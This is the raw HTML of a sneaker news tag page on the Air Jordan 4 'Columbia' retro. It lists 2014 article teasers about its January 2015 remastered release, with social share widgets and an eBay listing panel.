			<div id="cmn_wrap">
<!--container-->
<div id="main-home-container">
    <div class="wrapper">
        <div class="sneaker-con-main">
            <div class="left-main">
                <div class="tag-descriptoion">
                    <div class="tag-box">
                        <h1 >Browsing the "Air Jordan 4 Columbia" Tag</h1>
                        <p><p>The Air Jordan 4 Columbia was one of the first ever non-original colorways created for the Air Jordan 4. The Columbia 4s will be re-released January 10th, 2015 as part of Jordan Brand&#039;s remastered effort.</p>
</p>
                    </div>
                </div>
                                    <!-- Please call pinit.js only once per page -->
                    <script type="text/javascript" async src="//assets.pinterest.com/js/pinit.js"></script>

                                                                    <!--small-->

                        <section class="sneaker-post-main ">
                            <div class="sneaker-small-post">
                                <div class="small-post-data">
                                    <div class="post-header">
                                        <h2 class="header-title"><a href="http://sneakernews.com/2014/11/21/air-jordan-4-retro-releases-spring-2015/">
                                                                                                <span>Air Jordan 4 Retro Releases For Spring 2015</span></a></h2>
                                        <div class="date-and-name">
                                            <p><span>November 21, 2014 BY <a class="url fn n" href="http://sneakernews.com/author/pjohnson05/" title="View all posts by Patrick Johnson" rel="author">Patrick Johnson</a>  /</span>
											<b class="comment">
											30</b>
                                             <b class="rating">3.91 /  5</b></p>
                                        </div>
                                        <div class="social-shares">
                                            <div class="soc-icon">
                                                <div class="facebook social_box">
                                                    <div class="like_box">
                                                        <div class="fb-like" data-href="http://sneakernews.com/2014/11/21/air-jordan-4-retro-releases-spring-2015/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="twitter social_box">
                                                    <div class="like_box">
                                                        <a href="https://twitter.com/share" class="twitter-share-button external" data-count="horizontal" data-url="http://sneakernews.com/2014/11/21/air-jordan-4-retro-releases-spring-2015/" data-text="Air Jordan 4 Retro Releases For Spring 2015" data-via="sneakernews" target="_blank">Tweet</a>														
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="google social_box">
                                                    <div class="like_box">
                                                        <div class="g-plusone"  data-callback="googlePlusCallback" data-size="medium" data-href="http://sneakernews.com/2014/11/21/air-jordan-4-retro-releases-spring-2015/"></div>
                                                    </div>	
                                                </div>
                                                <div class="pinterest social_box">
                                                    <div class="like_box ">
                                                            <a href="//www.pinterest.com/pin/create/button/?url=http://sneakernews.com/2014/11/21/air-jordan-4-retro-releases-spring-2015/&#038;media=http://sneakernews.com/wp-content/uploads/2014/11/air-jordan-4-retro-releases-spring-2015-01.jpg" data-pin-do="buttonPin" data-pin-zero="true" data-pin-config="beside" class="external" target="_blank"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" /></a>
                                                        </div>
                                                </div>
                                            </div>

                                            <div class="shares-like">
                                                <strong>639</strong> <span>shares / likes</span>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="post-data">
                                                                                    <p><a href="http://sneakernews.com/2014/11/21/air-jordan-4-retro-releases-spring-2015/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/11/air-jordan-4-retro-releases-spring-2015-01.jpg" alt=""></a></p>
                                            <p>
It&#8217;s hard to believe, but the year of the Air Jordan 6 has almost come to a close. We&#8217;re only a month away from the holiday Air Jordan 11 release, and Black Friday is loomi...<a class="read-more" href="http://sneakernews.com/2014/11/21/air-jordan-4-retro-releases-spring-2015/">Read More</a></p>
                                        
                                                                            </div>

                                </div>
                            </div>
                        </section>
                        <!--small-->

                                                 

						                                                <!--small-->

                        <section class="sneaker-post-main ">
                            <div class="sneaker-small-post">
                                <div class="small-post-data">
                                    <div class="post-header">
                                        <h2 class="header-title"><a href="http://sneakernews.com/2014/11/05/air-jordan-retro-remastered-pricing/">
                                                                                                <span>Air Jordan Retro Remastered Pricing</span></a></h2>
                                        <div class="date-and-name">
                                            <p><span>November 5, 2014 BY <a class="url fn n" href="http://sneakernews.com/author/pjohnson05/" title="View all posts by Patrick Johnson" rel="author">Patrick Johnson</a>  /</span>
											<b class="comment">
											57</b>
                                             <b class="rating">4.38 /  5</b></p>
                                        </div>
                                        <div class="social-shares">
                                            <div class="soc-icon">
                                                <div class="facebook social_box">
                                                    <div class="like_box">
                                                        <div class="fb-like" data-href="http://sneakernews.com/2014/11/05/air-jordan-retro-remastered-pricing/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="twitter social_box">
                                                    <div class="like_box">
                                                        <a href="https://twitter.com/share" class="twitter-share-button external" data-count="horizontal" data-url="http://sneakernews.com/2014/11/05/air-jordan-retro-remastered-pricing/" data-text="Air Jordan Retro Remastered Pricing" data-via="sneakernews" target="_blank">Tweet</a>														
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="google social_box">
                                                    <div class="like_box">
                                                        <div class="g-plusone"  data-callback="googlePlusCallback" data-size="medium" data-href="http://sneakernews.com/2014/11/05/air-jordan-retro-remastered-pricing/"></div>
                                                    </div>	
                                                </div>
                                                <div class="pinterest social_box">
                                                    <div class="like_box ">
                                                            <a href="//www.pinterest.com/pin/create/button/?url=http://sneakernews.com/2014/11/05/air-jordan-retro-remastered-pricing/&#038;media=http://sneakernews.com/wp-content/uploads/2014/11/air-jordan-remastered-retros-pricing-info.jpg" data-pin-do="buttonPin" data-pin-zero="true" data-pin-config="beside" class="external" target="_blank"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" /></a>
                                                        </div>
                                                </div>
                                            </div>

                                            <div class="shares-like">
                                                <strong>441</strong> <span>shares / likes</span>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="post-data">
                                                                                    <p><a href="http://sneakernews.com/2014/11/05/air-jordan-retro-remastered-pricing/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/11/air-jordan-remastered-retros-pricing-info.jpg" alt=""></a></p>
                                            <p>
The countdown to Remastered Retro Jordans continues. The development that Jordan Brand is paying extra close attention to the quality of its flagship product has been one of the most a...<a class="read-more" href="http://sneakernews.com/2014/11/05/air-jordan-retro-remastered-pricing/">Read More</a></p>
                                        
                                                                            </div>

                                </div>
                            </div>
                        </section>
                        <!--small-->

                                                 

						                                                <!--small-->

                        <section class="sneaker-post-main ebay-before-section">
                            <div class="sneaker-small-post">
                                <div class="small-post-data">
                                    <div class="post-header">
                                        <h2 class="header-title"><a href="http://sneakernews.com/2014/10/09/air-jordan-4-columbia-release-date/">
                                                                                                <span>Air Jordan 4 &#8220;Columbia&#8221; &#8211; Release Date</span></a></h2>
                                        <div class="date-and-name">
                                            <p><span>October 9, 2014 BY <a class="url fn n" href="http://sneakernews.com/author/bdunne/" title="View all posts by Brendan Dunne" rel="author">Brendan Dunne</a>  /</span>
											<b class="comment">
											52</b>
                                             <b class="rating">4.58 /  5</b></p>
                                        </div>
                                        <div class="social-shares">
                                            <div class="soc-icon">
                                                <div class="facebook social_box">
                                                    <div class="like_box">
                                                        <div class="fb-like" data-href="http://sneakernews.com/2014/10/09/air-jordan-4-columbia-release-date/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="twitter social_box">
                                                    <div class="like_box">
                                                        <a href="https://twitter.com/share" class="twitter-share-button external" data-count="horizontal" data-url="http://sneakernews.com/2014/10/09/air-jordan-4-columbia-release-date/" data-text="Air Jordan 4 &#8220;Columbia&#8221; &#8211; Release Date" data-via="sneakernews" target="_blank">Tweet</a>														
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="google social_box">
                                                    <div class="like_box">
                                                        <div class="g-plusone"  data-callback="googlePlusCallback" data-size="medium" data-href="http://sneakernews.com/2014/10/09/air-jordan-4-columbia-release-date/"></div>
                                                    </div>	
                                                </div>
                                                <div class="pinterest social_box">
                                                    <div class="like_box ">
                                                            <a href="//www.pinterest.com/pin/create/button/?url=http://sneakernews.com/2014/10/09/air-jordan-4-columbia-release-date/&#038;media=http://sneakernews.com/wp-content/uploads/2014/10/columbia-jordan-4-2015.jpg" data-pin-do="buttonPin" data-pin-zero="true" data-pin-config="beside" class="external" target="_blank"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" /></a>
                                                        </div>
                                                </div>
                                            </div>

                                            <div class="shares-like">
                                                <strong>1291</strong> <span>shares / likes</span>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="post-data">
                                                                                    <p><a href="http://sneakernews.com/2014/10/09/air-jordan-4-columbia-release-date/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/10/columbia-jordan-4-2015.jpg" alt=""></a></p>
                                            <p>
The Air Jordan 4 &#8220;Columbia&#8221; release date is January 10th, 2015. That means that this pair will be the first of the remastered Jordans planned for the new year, with the Jor...<a class="read-more" href="http://sneakernews.com/2014/10/09/air-jordan-4-columbia-release-date/">Read More</a></p>
                                        
                                                                            </div>

                                </div>
                            </div>
                        </section>
                        <!--small-->

                                                 									<section class="post-wpad group">
										<div id="ebay-embed">

<style type="text/css">
#ebay-embed * {vertical-align:middle}
#ebay-embed table  {margin:0 auto !important;padding:0 !important; clear: both;}
#ebay-embed table:nth-child(2) {}
#ebay-embed table img {border:0 !important}
#ebay-embed table tr td {margin:0 !important;padding:0 !important;vertical-align:middle}
#ebay-embed table tr td[colspan="3"],
#ebay-embed table tr td[colspan="5"] {line-height:0 !important}
#ebay-embed table tr td a img {height:auto;margin:0 !important;padding:0 !important;display:inline-block;}
#ebay-embed table tr td img {height:1px;margin:0 !important;padding:0 !important;display:inline-block;}
#ebay-embed table tr  {margin:0 !important;padding:0 !important;}
#ebay-embed table tr td table tr td[align="right"] br {display:none !important}
#ebay-embed table tr td table tr td[align="right"] form {float:left !important}
#ebay-embed table tr td table tr td[align="right"] form input[type="text"] {float:left !important;width:240px;margin:0 5px 0 0 !important;padding:9px !important}
#ebay-embed table tr td table tr td[align="right"] form img {display:none !important}
#ebay-embed table tr td table tr td[align="right"] form input[type="submit"] {float:left !important}
</style>
</div> <div class="ebay-index">					
										<div class="ebay-index-header">
				                        	<div  class="index-header-main">
				                            	<a href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?campid=5335897303&#038;customid=SND+Air+Jordan+IV+Columbia&#038;toolid=10004&#038;mpre=http://pages.ebay.com/" class="external" target="_blank">
				                            		<img border="0" src="http://cdn.sneakernews.com/wp-content/plugins/post-snippets/src/PostSnippets/img/ebay.jpg " alt=" eBay Marketplace Logo ">
				                            	</a>
				                            	 <span>"Air Jordan IV Columbia" </span>
				                                 <b><a href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=4&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Columbia&#038;lgeo=1&#038;mpre=http%3A%2F%2Fwww.ebay.com%2Fsch%2Fi.html%3F_nkw%3DAir%2BJordan%2BIV%2BColumbia%26_ddo%3D1%26_ipg%3D4%26_pgn%3D1%26_sop%3D1" class="external" target="_blank">view all 579 items on ebay</a></b>
				                            </div>
				                        </div><div class="ebay-index-main">
                            	<ul><li >
											<div class="ebay-index-img"><img src="http://thumbs3.ebaystatic.com/m/mdggBXVRPSQDe59jPk0rWgQ/140.jpg" alt="ebay Producr" />
												<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=2&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Columbia&#038;lgeo=1&#038;vectorid=229466&#038;item=191464341558&#038;campid=5335897303" class="external">
													<span>VIEW ITEM</span>
												</a>
											</div><div class="ebay-index-data">
                                        	<span class="blue-bg"></span>
                                            <span class="ebay-price">$199<sup>.99</sup></span>
                                            <strong>0 bids</strong>
                                            <b>14<sup>hr</sup> 22<sup>mins</sup></b>
                                         </div></li><li >
											<div class="ebay-index-img"><img src="http://thumbs4.ebaystatic.com/m/mgTPW31fa-spLPZkgk91Bcg/140.jpg" alt="ebay Producr" />
												<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=2&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Columbia&#038;lgeo=1&#038;vectorid=229466&#038;item=171626048967&#038;campid=5335897303" class="external">
													<span>VIEW ITEM</span>
												</a>
											</div><div class="ebay-index-data">
                                        	<span class="blue-bg"></span>
                                            <span class="ebay-price">$169<sup>.99</sup></span>
                                            <strong>0 bids</strong>
                                            <b>15<sup>hr</sup> 56<sup>mins</sup></b>
                                         </div></li><li >
											<div class="ebay-index-img"><img src="http://thumbs2.ebaystatic.com/m/ml6J4w5nErJ8E52bBRGBTKA/140.jpg" alt="ebay Producr" />
												<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=2&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Columbia&#038;lgeo=1&#038;vectorid=229466&#038;item=161535220037&#038;campid=5335897303" class="external">
													<span>VIEW ITEM</span>
												</a>
											</div><div class="ebay-index-data">
                                        	<span class="blue-bg"></span>
                                            <span class="ebay-price">$360<sup>.00</sup></span>
                                            <strong>BUY IT NOW</strong>
                                            <b>16<sup>hr</sup> 33<sup>mins</sup></b>
                                         </div></li><li class='last-ebay' >
											<div class="ebay-index-img"><img src="http://thumbs1.ebaystatic.com/m/m7azy-1U1wWreBA-_ZccmyA/140.jpg" alt="ebay Producr" />
												<a target="_blank" href="http://rover.ebay.com/rover/1/711-53200-19255-0/1?ff3=2&#038;toolid=10041&#038;campid=5335897303&#038;customid=SND+Air+Jordan+IV+Columbia&#038;lgeo=1&#038;vectorid=229466&#038;item=121532151324&#038;campid=5335897303" class="external">
													<span>VIEW ITEM</span>
												</a>
											</div><div class="ebay-index-data">
                                        	<span class="blue-bg"></span>
                                            <span class="ebay-price">$300<sup>.00</sup></span>
                                            <strong>BUY IT NOW</strong>
                                            <b>16<sup>hr</sup> 51<sup>mins</sup></b>
                                         </div></li> </ul>
                            </div>                            
                         </div>									</section>
							                                                

						                                                <!--small-->

                        <section class="sneaker-post-main ">
                            <div class="sneaker-small-post">
                                <div class="small-post-data">
                                    <div class="post-header">
                                        <h2 class="header-title"><a href="http://sneakernews.com/2014/09/30/jordan-brand-introduces-20-retro-double-nickel-spring-2015/">
                                                                                                <span>Jordan Brand Introduces The 20 Retro, &#8220;Double Nickel&#8221;, and More For Spring 2015</span></a></h2>
                                        <div class="date-and-name">
                                            <p><span>September 30, 2014 BY <a class="url fn n" href="http://sneakernews.com/author/bdunne/" title="View all posts by Brendan Dunne" rel="author">Brendan Dunne</a>  /</span>
											<b class="comment">
											94 c</b>
                                             </p>
                                        </div>
                                        <div class="social-shares">
                                            <div class="soc-icon">
                                                <div class="facebook social_box">
                                                    <div class="like_box">
                                                        <div class="fb-like" data-href="http://sneakernews.com/2014/09/30/jordan-brand-introduces-20-retro-double-nickel-spring-2015/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="twitter social_box">
                                                    <div class="like_box">
                                                        <a href="https://twitter.com/share" class="twitter-share-button external" data-count="horizontal" data-url="http://sneakernews.com/2014/09/30/jordan-brand-introduces-20-retro-double-nickel-spring-2015/" data-text="Jordan Brand Introduces The 20 Retro, &#8220;Double Nickel&#8221;, and More For Spring 2015" data-via="sneakernews" target="_blank">Tweet</a>														
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="google social_box">
                                                    <div class="like_box">
                                                        <div class="g-plusone"  data-callback="googlePlusCallback" data-size="medium" data-href="http://sneakernews.com/2014/09/30/jordan-brand-introduces-20-retro-double-nickel-spring-2015/"></div>
                                                    </div>	
                                                </div>
                                                <div class="pinterest social_box">
                                                    <div class="like_box ">
                                                            <a href="//www.pinterest.com/pin/create/button/?url=http://sneakernews.com/2014/09/30/jordan-brand-introduces-20-retro-double-nickel-spring-2015/&#038;media=http://sneakernews.com/wp-content/uploads/2014/09/jordan-release-dates-2015.jpg" data-pin-do="buttonPin" data-pin-zero="true" data-pin-config="beside" class="external" target="_blank"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" /></a>
                                                        </div>
                                                </div>
                                            </div>

                                            <div class="shares-like">
                                                <strong>873</strong> <span>shares / likes</span>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="post-data">
                                                                                    <p><a href="http://sneakernews.com/2014/09/30/jordan-brand-introduces-20-retro-double-nickel-spring-2015/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/09/jordan-release-dates-2015.jpg" alt=""></a></p>
                                            <p>
If you&#8217;re already excited about the remastered Air Jordans coming for next year, then this next batch of info should have you even more excited for Jordan Brand&#8217;s 2015 plan...<a class="read-more" href="http://sneakernews.com/2014/09/30/jordan-brand-introduces-20-retro-double-nickel-spring-2015/">Read More</a></p>
                                        
                                                                            </div>

                                </div>
                            </div>
                        </section>
                        <!--small-->

                                                 

						                                                <!--small-->

                        <section class="sneaker-post-main ">
                            <div class="sneaker-small-post">
                                <div class="small-post-data">
                                    <div class="post-header">
                                        <h2 class="header-title"><a href="http://sneakernews.com/2014/09/25/remastered-air-jordan-4-retro-columbia/">
                                                                                                <span>Another Look at the Remastered Air Jordan 4 Retro &#8220;Columbia&#8221;</span></a></h2>
                                        <div class="date-and-name">
                                            <p><span>September 25, 2014 BY <a class="url fn n" href="http://sneakernews.com/author/bdunne/" title="View all posts by Brendan Dunne" rel="author">Brendan Dunne</a>  /</span>
											<b class="comment">
											33</b>
                                             <b class="rating">5 /  5</b></p>
                                        </div>
                                        <div class="social-shares">
                                            <div class="soc-icon">
                                                <div class="facebook social_box">
                                                    <div class="like_box">
                                                        <div class="fb-like" data-href="http://sneakernews.com/2014/09/25/remastered-air-jordan-4-retro-columbia/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="twitter social_box">
                                                    <div class="like_box">
                                                        <a href="https://twitter.com/share" class="twitter-share-button external" data-count="horizontal" data-url="http://sneakernews.com/2014/09/25/remastered-air-jordan-4-retro-columbia/" data-text="Another Look at the Remastered Air Jordan 4 Retro &#8220;Columbia&#8221;" data-via="sneakernews" target="_blank">Tweet</a>														
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="google social_box">
                                                    <div class="like_box">
                                                        <div class="g-plusone"  data-callback="googlePlusCallback" data-size="medium" data-href="http://sneakernews.com/2014/09/25/remastered-air-jordan-4-retro-columbia/"></div>
                                                    </div>	
                                                </div>
                                                <div class="pinterest social_box">
                                                    <div class="like_box ">
                                                            <a href="//www.pinterest.com/pin/create/button/?url=http://sneakernews.com/2014/09/25/remastered-air-jordan-4-retro-columbia/&#038;media=http://sneakernews.com/wp-content/uploads/2014/09/columbia-jordan-4-remastered.jpg" data-pin-do="buttonPin" data-pin-zero="true" data-pin-config="beside" class="external" target="_blank"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" /></a>
                                                        </div>
                                                </div>
                                            </div>

                                            <div class="shares-like">
                                                <strong>601</strong> <span>shares / likes</span>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="post-data">
                                                                                    <p><a href="http://sneakernews.com/2014/09/25/remastered-air-jordan-4-retro-columbia/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/09/columbia-jordan-4-remastered.jpg" alt=""></a></p>
                                            <p>
It remains to be seen whether or not any original colorways of the Air Jordan 4 will be remastered once Jordan Brand hits the reset button on retro shapes come 2015. There&#8217;s no d...<a class="read-more" href="http://sneakernews.com/2014/09/25/remastered-air-jordan-4-retro-columbia/">Read More</a></p>
                                        
                                                                            </div>

                                </div>
                            </div>
                        </section>
                        <!--small-->

                                                 

						                                                <!--small-->

                        <section class="sneaker-post-main ">
                            <div class="sneaker-small-post">
                                <div class="small-post-data">
                                    <div class="post-header">
                                        <h2 class="header-title"><a href="http://sneakernews.com/2014/08/29/reconstructing-greatness-inside-air-jordan-retro-remaster-program/">
                                                <img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/feature-icon.png" alt="Reconstructing Greatness: Inside the Air Jordan Retro Remaster Program" >                                                <span>Reconstructing Greatness: Inside the Air Jordan Retro Remaster Program</span></a></h2>
                                        <div class="date-and-name">
                                            <p><span>August 29, 2014 BY <a class="url fn n" href="http://sneakernews.com/author/trooper/" title="View all posts by Aaron Kr." rel="author">Aaron Kr.</a>  /</span>
											<b class="comment">
											147</b>
                                             </p>
                                        </div>
                                        <div class="social-shares">
                                            <div class="soc-icon">
                                                <div class="facebook social_box">
                                                    <div class="like_box">
                                                        <div class="fb-like" data-href="http://sneakernews.com/2014/08/29/reconstructing-greatness-inside-air-jordan-retro-remaster-program/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="twitter social_box">
                                                    <div class="like_box">
                                                        <a href="https://twitter.com/share" class="twitter-share-button external" data-count="horizontal" data-url="http://sneakernews.com/2014/08/29/reconstructing-greatness-inside-air-jordan-retro-remaster-program/" data-text="Reconstructing Greatness: Inside the Air Jordan Retro Remaster Program" data-via="sneakernews" target="_blank">Tweet</a>														
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="google social_box">
                                                    <div class="like_box">
                                                        <div class="g-plusone"  data-callback="googlePlusCallback" data-size="medium" data-href="http://sneakernews.com/2014/08/29/reconstructing-greatness-inside-air-jordan-retro-remaster-program/"></div>
                                                    </div>	
                                                </div>
                                                <div class="pinterest social_box">
                                                    <div class="like_box ">
                                                            <a href="//www.pinterest.com/pin/create/button/?url=http://sneakernews.com/2014/08/29/reconstructing-greatness-inside-air-jordan-retro-remaster-program/&#038;media=http://sneakernews.com/wp-content/uploads/2014/08/sn-select-air-jordan-remastered-cover.jpg" data-pin-do="buttonPin" data-pin-zero="true" data-pin-config="beside" class="external" target="_blank"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" /></a>
                                                        </div>
                                                </div>
                                            </div>

                                            <div class="shares-like">
                                                <strong>2079</strong> <span>shares / likes</span>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="post-data">
                                                                                    <p><a href="http://sneakernews.com/2014/08/29/reconstructing-greatness-inside-air-jordan-retro-remaster-program/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/08/sn-select-air-jordan-remastered-cover.jpg" alt=""></a></p>
                                            <p>

Jordan Brand&#8217;s Retro Remaster initiative is not just about using premium materials. It&#8217;s about refining the art of traditional shoe-making in a day and age when innovative...<a class="read-more" href="http://sneakernews.com/2014/08/29/reconstructing-greatness-inside-air-jordan-retro-remaster-program/">Read More</a></p>
                                        
                                                                            </div>

                                </div>
                            </div>
                        </section>
                        <!--small-->

                                                 

						                                                <!--small-->

                        <section class="sneaker-post-main ">
                            <div class="sneaker-small-post">
                                <div class="small-post-data">
                                    <div class="post-header">
                                        <h2 class="header-title"><a href="http://sneakernews.com/2014/08/19/air-jordan-4-columbia-2015-retro-remastered/">
                                                                                                <span>Air Jordan 4 &#8220;Columbia&#8221; &#8211; 2015 Retro Remastered</span></a></h2>
                                        <div class="date-and-name">
                                            <p><span>August 19, 2014 BY <a class="url fn n" href="http://sneakernews.com/author/johnkimx83/" title="View all posts by John Kim" rel="author">John Kim</a>  /</span>
											<b class="comment">
											117 </b>
                                             <b class="rating">4.67 /  5</b></p>
                                        </div>
                                        <div class="social-shares">
                                            <div class="soc-icon">
                                                <div class="facebook social_box">
                                                    <div class="like_box">
                                                        <div class="fb-like" data-href="http://sneakernews.com/2014/08/19/air-jordan-4-columbia-2015-retro-remastered/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="twitter social_box">
                                                    <div class="like_box">
                                                        <a href="https://twitter.com/share" class="twitter-share-button external" data-count="horizontal" data-url="http://sneakernews.com/2014/08/19/air-jordan-4-columbia-2015-retro-remastered/" data-text="Air Jordan 4 &#8220;Columbia&#8221; &#8211; 2015 Retro Remastered" data-via="sneakernews" target="_blank">Tweet</a>														
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="google social_box">
                                                    <div class="like_box">
                                                        <div class="g-plusone"  data-callback="googlePlusCallback" data-size="medium" data-href="http://sneakernews.com/2014/08/19/air-jordan-4-columbia-2015-retro-remastered/"></div>
                                                    </div>	
                                                </div>
                                                <div class="pinterest social_box">
                                                    <div class="like_box ">
                                                            <a href="//www.pinterest.com/pin/create/button/?url=http://sneakernews.com/2014/08/19/air-jordan-4-columbia-2015-retro-remastered/&#038;media=http://sneakernews.com/wp-content/uploads/2014/08/remastered-air-jordan-4-columbia.jpg" data-pin-do="buttonPin" data-pin-zero="true" data-pin-config="beside" class="external" target="_blank"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" /></a>
                                                        </div>
                                                </div>
                                            </div>

                                            <div class="shares-like">
                                                <strong>797</strong> <span>shares / likes</span>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="post-data">
                                                                                    <p><a href="http://sneakernews.com/2014/08/19/air-jordan-4-columbia-2015-retro-remastered/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/08/remastered-air-jordan-4-columbia.jpg" alt=""></a></p>
                                            <p>
2015 will be a hallmark year for Jordan Brand thanks to the new Remastered line of Retro releases. Quick refresher: &#8220;Remastered&#8221; is a coined term for a new style of Air Jor...<a class="read-more" href="http://sneakernews.com/2014/08/19/air-jordan-4-columbia-2015-retro-remastered/">Read More</a></p>
                                        
                                                                            </div>

                                </div>
                            </div>
                        </section>
                        <!--small-->

                                                 

						                                                <!--small-->

                        <section class="sneaker-post-main ">
                            <div class="sneaker-small-post">
                                <div class="small-post-data">
                                    <div class="post-header">
                                        <h2 class="header-title"><a href="http://sneakernews.com/2014/06/11/air-jordan-4-columbia-remastered-2015/">
                                                <img src="http://cdn.sneakernews.com/wp-content/themes/sneakernews/images/hd-icon.png" alt="Air Jordan 4 &#8220;Columbia&#8221; Remastered for 2015" >                                                <span>Air Jordan 4 &#8220;Columbia&#8221; Remastered for 2015</span></a></h2>
                                        <div class="date-and-name">
                                            <p><span>June 11, 2014 BY <a class="url fn n" href="http://sneakernews.com/author/admin/" title="View all posts by Sneaker News" rel="author">Sneaker News</a>  /</span>
											<b class="comment">
											37 </b>
                                             <b class="rating">5 /  5</b></p>
                                        </div>
                                        <div class="social-shares">
                                            <div class="soc-icon">
                                                <div class="facebook social_box">
                                                    <div class="like_box">
                                                        <div class="fb-like" data-href="http://sneakernews.com/2014/06/11/air-jordan-4-columbia-remastered-2015/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="twitter social_box">
                                                    <div class="like_box">
                                                        <a href="https://twitter.com/share" class="twitter-share-button external" data-count="horizontal" data-url="http://sneakernews.com/2014/06/11/air-jordan-4-columbia-remastered-2015/" data-text="Air Jordan 4 &#8220;Columbia&#8221; Remastered for 2015" data-via="sneakernews" target="_blank">Tweet</a>														
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="google social_box">
                                                    <div class="like_box">
                                                        <div class="g-plusone"  data-callback="googlePlusCallback" data-size="medium" data-href="http://sneakernews.com/2014/06/11/air-jordan-4-columbia-remastered-2015/"></div>
                                                    </div>	
                                                </div>
                                                <div class="pinterest social_box">
                                                    <div class="like_box ">
                                                            <a href="//www.pinterest.com/pin/create/button/?url=http://sneakernews.com/2014/06/11/air-jordan-4-columbia-remastered-2015/&#038;media=http://sneakernews.com/wp-content/uploads/2014/06/jordan-4-columbia-2015-remastered-3.jpg" data-pin-do="buttonPin" data-pin-zero="true" data-pin-config="beside" class="external" target="_blank"><img src="//assets.pinterest.com/images/pidgets/pinit_fg_en_rect_gray_20.png" /></a>
                                                        </div>
                                                </div>
                                            </div>

                                            <div class="shares-like">
                                                <strong>1222</strong> <span>shares / likes</span>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="post-data">
                                                                                    <p><a href="http://sneakernews.com/2014/06/11/air-jordan-4-columbia-remastered-2015/"><img src="http://cdn.sneakernews.com/wp-content/uploads/2014/06/jordan-4-columbia-2015-remastered-3.jpg" alt=""></a></p>
                                            <p>
Jordan Brand is going way back to the dawn of Retro+ colorways for their 2015 remastering process. Hence the retun of the Air Jordan 4 &#8220;Columbia&#8221; with its lush leather buil...<a class="read-more" href="http://sneakernews.com/2014/06/11/air-jordan-4-columbia-remastered-2015/">Read More</a></p>
                                        
                                                                            </div>

                                </div>
                            </div>
                        </section>
                        <!--small-->

                                                 

						                                                <!--small-->

                        <section class="sneaker-post-main ">
                            <div class="sneaker-small-post">
                                <div class="small-post-data">
                                    <div class="post-header">
                                        <h2 class="header-title"><a href="http://sneakernews.com/2014/06/06/air-jordan-retros-confirmed-spring-2015/">
                                                                                                <span>Air Jordan Retros Confirmed For Spring 2015</span></a></h2>
                                        <div class="date-and-name">
                                            <p><span>June 6, 2014 BY <a class="url fn n" href="http://sneakernews.com/author/johnkimx83/" title="View all posts by John Kim" rel="author">John Kim</a>  /</span>
											<b class="comment">
											49</b>
                                             <b class="rating">2.78 /  5</b></p>
                                        </div>
                                        <div class="social-shares">
                                            <div class="soc-icon">
                                                <div class="facebook social_box">
                                                    <div class="like_box">
                                                        <div class="fb-like" data-href="http://sneakernews.com/2014/06/06/air-jordan-retros-confirmed-spring-2015/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                                                    </div>
                                                </div>
                                                <!--twitter-->
                                                <div class="twitter social_box">
                                                    <div class="like_box">
